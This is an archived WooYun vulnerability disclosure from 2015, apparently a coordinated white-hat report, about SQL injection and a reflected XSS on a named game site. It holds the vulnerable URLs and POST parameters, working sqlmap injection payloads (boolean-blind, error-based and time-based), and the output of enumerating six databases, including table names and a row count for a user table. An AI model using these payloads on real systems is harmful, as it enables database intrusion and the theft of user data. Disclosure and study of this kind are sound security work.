wybug_title: 威锋网某站SQL注射影响大量数据库
wybug_detail:
漏洞详情 披露状态：   									2015-01-14：	细节已通知厂商并且等待厂商处理中									2015-01-14：	厂商已经确认，细节仅向厂商公开									2015-01-24：	细节向核心白帽子及相关领域专家公开									2015-02-03：	细节向普通白帽子公开									2015-02-13：	细节向实习白帽子公开									2015-02-28：	细节向公众公开  简要描述： 233 详细说明：  多处SQL注射：1，http://game.feng.com/game/newsAuthor/jsonToInformation-page-2-type-all-sort-time_desc.shtml?contributor=98wwcc



通过2次返回结果判定注入存在2，POST型http://game.feng.com:80/game/topicread/getNewFormerData.shtml (POST)game_ids=1445909,1446139,1446138,1445876,1445776,1445997,1032663,1391182,1376035,1445917&special_id=13，http://game.feng.com:80/game/topicread/getSpecialCommentList.shtml (POST)ord=&page=(select%20convert(int%2cCHAR(65)))&special_id=1144，http://game.feng.com:80/index.php?r=game/site/getCategoryGames  (POST)cate_id=1'%22   漏洞证明：  
---Parameter: special_id (POST)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: game_ids=1445909,1446139,1446138,1445876,1445776,1445997,1032663,1391182,1376035,1445917&special_id=1 RLIKE (SELECT (CASE WHEN (7452=7452) THEN 1 ELSE 0x28 END))    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: game_ids=1445909,1446139,1446138,1445876,1445776,1445997,1032663,1391182,1376035,1445917&special_id=1 AND (SELECT 1560 FROM(SELECT COUNT(*),CONCAT(0x7170716a71,(SELECT (CASE WHEN (1560=1560) THEN 1 ELSE 0 END)),0x71626b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: game_ids=1445909,1446139,1446138,1445876,1445776,1445997,1032663,1391182,1376035,1445917&special_id=1 AND SLEEP(5)---back-end DBMS: MySQL 5.0available databases [6]:[*] information_schema[*] mysql[*] performance_schema[*] test[*] we+[*] weapodspaceDatabase: weapodspace[11 tables]+-------------------------+| system_cache            || system_cache_group      || system_function         || system_module           || system_right            || system_right_url        || system_role             || system_role_right       || system_user_role        || weiphone_app_*_info     || weiphone_app_*_info_1   |+-------------------------+Database: we+[271 tables]+----------------------------------------+| we_user_expert(delete)                 || account_record                         || admin_log                              || admin_message                          || admin_user                             || android_market_file_info               || app_advertisement                      || app_and_article_relations              || app_android_entity                     || app_android_entity_datetime            || app_android_entity_decimal             || app_android_entity_int                 || app_android_entity_text                || app_android_entity_varchar             || app_android_flat                       || app_android_flat_exten                 || app_article                                                     表太多，就补贴出来了。select count(*) from  weiphone_app_use_info:    '129261673'


   修复方案：  再送一个反射XSS http://game.feng.com:80/index.php?kw=求20RANK！！！   版权声明：转载请注明来源 紫霞仙子@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-14 14:08 厂商回复： 谢谢，我们修补中 最新状态： 暂无
